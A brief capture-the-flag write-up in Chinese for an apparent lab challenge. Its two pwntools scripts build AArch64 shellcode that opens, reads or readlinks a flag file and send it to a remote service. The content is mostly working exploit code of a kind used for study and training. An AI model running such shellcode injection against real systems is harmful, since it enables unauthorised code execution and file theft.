## reverse 1
提示是misc1，因此代表要寫AArc64的shellcode，將pwn1的shellcode改成AArch64後送出，會發現提示flag是link，要用`readlink()`這個syscall
```python
#!/usr/bin/env python3
from pwn import *

context.update(os='linux', arch='aarch64')

s = ''
s += shellcraft.pushstr('/home/rev1/flag\x00\x00\x00')
s += shellcraft.open('sp', constants.O_RDONLY, 0)
s += shellcraft.read('x0', 'sp', 120)
s += shellcraft.write(1, 'sp', 'x0')

r = remote('10.13.2.44', 10732)
r.sendline(asm(s))
r.interactive()
```
改成`readlink()`完`write()`出buffer即可

```python
#!/usr/bin/env python3
from pwn import *

context.update(os='linux', arch='aarch64')

s = ''
s += shellcraft.pushstr('/home/rev1/flag\x00')
s += shellcraft.readlink('sp', 'sp', 100)
s += shellcraft.write(1, 'sp', 120)

r = remote('10.13.2.44', 10732)
r.sendline(asm(s))
r.interactive()
```
